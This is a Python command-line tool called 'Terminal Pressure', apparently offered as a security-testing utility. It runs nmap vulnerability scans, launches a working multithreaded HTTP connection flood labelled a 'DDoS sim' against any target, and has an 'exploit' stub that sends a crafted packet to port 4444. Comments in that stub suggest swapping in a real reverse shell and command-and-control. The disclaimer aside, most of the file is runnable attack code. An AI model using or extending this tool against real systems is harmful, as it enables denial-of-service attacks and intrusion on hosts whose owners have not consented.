terminal_pressure.py
#!/usr/bin/env python3
# Copyright (c) 2025 CyberViser. All Rights Reserved.
# Licensed under the CyberViser Proprietary License — see LICENSE for details.
# FOR AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is illegal and prohibited.
import argparse
import nmap  # Requires pip install python-nmap (user installs)
import socket
import requests
from scapy.all import *  # For packet crafting; pip install scapy
import random
import threading
import time

def scan_vulns(target):
    scanner = nmap.PortScanner()
    print(f"[+] Pressuring target: {target}")
    scanner.scan(target, '1-1024', '-sV --script vuln')
    for host in scanner.all_hosts():
        print(f"Host: {host}")
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                service = scanner[host][proto][port]['name']
                print(f"Port {port}/{proto}: {state} ({service})")
                if 'script' in scanner[host][proto][port]:
                    for script in scanner[host][proto][port]['script']:
                        print(f"Vuln Script: {script} - {scanner[host][proto][port]['script'][script]}")

def stress_test(target, port=80, threads=50, duration=60):
    def flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass
    print(f"[+] Applying pressure to {target}:{port} with {threads} threads for {duration}s")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()

def exploit_chain(target, payload="default_backdoor"):
    # Shadow module: Simulate exploit (real: inject shellcode)
    if payload == "default_backdoor":
        print(f"[+] Injecting backdoor sim on {target} - Codex tip: Replace with real rev-shell")
        # Placeholder: In prod, use metasploit embeds or custom C2
        pkt = IP(dst=target)/TCP(dport=4444, flags="S")/Raw(load="CHAOS_AWAKEN")
        send(pkt, verbose=0)
    else:
        print(f"[+] Custom exploit chain: {payload}")

def main():
    parser = argparse.ArgumentParser(description="Terminal Pressure: Cyber Tool for Pressure Testing")
    subparsers = parser.add_subparsers(dest='command')

    scan_parser = subparsers.add_parser('scan', help='Scan for vulnerabilities')
    scan_parser.add_argument('target', type=str, help='Target IP/hostname')

    stress_parser = subparsers.add_parser('stress', help='Stress test (DDoS sim)')
    stress_parser.add_argument('target', type=str, help='Target IP/hostname')
    stress_parser.add_argument('--port', type=int, default=80, help='Port')
    stress_parser.add_argument('--threads', type=int, default=50, help='Threads')
    stress_parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')

    exploit_parser = subparsers.add_parser('exploit', help='Exploit chain (advanced)')
    exploit_parser.add_argument('target', type=str, help='Target IP/hostname')
    exploit_parser.add_argument('--payload', type=str, default='default_backdoor', help='Payload type')

    args = parser.parse_args()

    if args.command == 'scan':
        scan_vulns(args.target)
    elif args.command == 'stress':
        stress_test(args.target, args.port, args.threads, args.duration)
    elif args.command == 'exploit':
        exploit_chain(args.target, args.payload)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
